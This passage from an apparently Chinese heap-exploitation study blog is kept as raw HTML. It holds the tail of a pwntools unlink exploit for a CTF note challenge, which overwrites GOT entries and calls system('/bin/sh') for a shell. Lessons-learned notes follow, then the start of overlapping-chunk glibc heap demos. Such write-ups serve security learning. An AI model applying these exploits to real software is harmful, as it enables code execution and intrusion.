operator">+</span>elf_name<span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./"</span> <span class="token operator">+</span> elf_name<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"(less than 1024)"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"id is "</span><span class="token punctuation">)</span>    note_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Add chunk["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>note_id<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> note_id<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"the note:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"new content:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"the note:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"0000"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 0</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"1111"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 1</span>    add<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token string">"2222"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 2</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"3333"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 3</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"4444"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 4</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"5555"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 5</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 6</span>        ptr <span class="token operator">=</span> <span class="token number">0x6020e0</span>    fd <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x18</span>    bk <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span>    <span class="token comment"># gdb.attach(p)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"4444"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 4</span>    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 0x00 00 00 00 40 07 30</span>    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    <span class="token comment"># edit(0,p64(elf.plt['puts']))</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    atoi_addr <span class="token operator">=</span>  u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"atoi_addr : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"sys_addr : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>通过这题大概掌握了unlink的利用，果然还是做题管用，学unlink还顺便加深了我对 plt&amp;got表 与其 真实地址 的理解  ）</p><p>但在这题时出现了一点问题，由于填入地址往往时通过p64（）手段来进行小端序处理，但是got填入的时候填8个字节会过长（no pie）</p><p>之后程序便会报一大堆奇奇怪怪的错误，调试了好久才发现是覆盖地址的时候太长导致的段错误</p><p>以后做题要注意，覆盖地址的时候除了p64（）打包之外，还要注意被覆盖的地址的长度到底有没有8位，如果过长可以舍去p64（）的后几位<code>&#39;\x00&#39;</code>在填入进行覆盖。</p><p>还有一个就是要注意for循环等等判断条件的时候两边数据类型是否相同，这处也是一个可能会出现整数溢出的点。</p><h2 id="0x05-overlapping-chunks"><a href="#0x05-overlapping-chunks" class="headerlink" title="0x05 overlapping_chunks"></a>0x05 overlapping_chunks</h2><blockquote><p>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p></blockquote><p>如果有可能写到下一个 chunk 的 size 位，就可以利用 chunk overlapping。当下一个区块的 prev_size 被当前 chunk 使用时，只要当前 chunk 能有一个 off by one 就可以对下一个 chunk 的 size 位进行写，从而实现 chunk overlapping。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* A simple tale of overlapping chunk. This technique is taken from http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is a simple chunks overlapping problem\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's start to allocate 3 chunks on the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's free the chunk p2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"For a toy program, the value of the last 3 bits is unimportant;"</span><span class="token string">" however, it is best to maintain the stability of the heap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span><span class="token string">" to assure that p1 is not mistaken for a free chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> evil_chunk_size <span class="token operator">=</span> <span class="token number">0x181</span><span class="token punctuation">;</span><span class="token keyword">int</span> evil_region_size <span class="token operator">=</span> <span class="token number">0x180</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span><span class="token punctuation">,</span> evil_chunk_size<span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> evil_chunk_size<span class="token punctuation">;</span> <span class="token comment">// we are overwriting the "size" field of chunk p2</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's allocate another chunk with a size equal to the data\n"</span>       <span class="token string">"size of the chunk p2 injected size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This malloc will be served from the previously freed chunk that\n"</span>       <span class="token string">"is parked in the unsorted bin which size has been modified by us\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\np4 has been allocated at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 starts at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span><span class="token string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's run through an example. Right now, we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIf we memset(p4, '4', %d), we have:\n"</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span> <span class="token char">'4'</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中先是创建了三个堆块，大小分别为 0x100，0x100，0x80</p><p>之后修改第二个堆块的size为0x180（包含了自己和下一个堆块），在free掉第二个堆块，ptmalloc就会仅仅更具chunk2的head部分来判断大小，故会直接把chunk2和chunk3当成一个chunk来释放掉，但是我们指向chunk3的指针仍然存在，进而可以近一步利用</p><p><img src="https://pic.imgdb.cn/item/6118b8e95132923bf8cc809a.jpg"></p><h2 id="0x06-overlapping-chunks-2"><a href="#0x06-overlapping-chunks-2" class="headerlink" title="0x06 overlapping_chunks_2"></a>0x06 overlapping_chunks_2</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Yet another simple tale of overlapping chunk. This technique is taken from https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.  This is also referenced as Nonadjacent Free Chunk Consolidation Attack.*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">,</span><span class="token operator">*</span>p5<span class="token punctuation">,</span><span class="token operator">*</span>p6<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> real_size_p1<span class="token punctuation">,</span>real_size_p2<span class="token punctuation">,</span>real_size_p3<span class="token punctuation">,</span>real_size_p4<span class="token punctuation">,</span>real_size_p5<span class="token punctuation">,</span>real_size_p6<span class="token punctuation">;</span>  <span class="token keyword">int</span> prev_in_use <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is a simple chunks overlapping problem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's start to allocate 5 chunks on the heap:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  real_size_p1 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  real_size_p2 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>  real_size_p3 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>  real_size_p4 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>  real_size_p5 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\n\nchunk p1 from %p to %p"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span 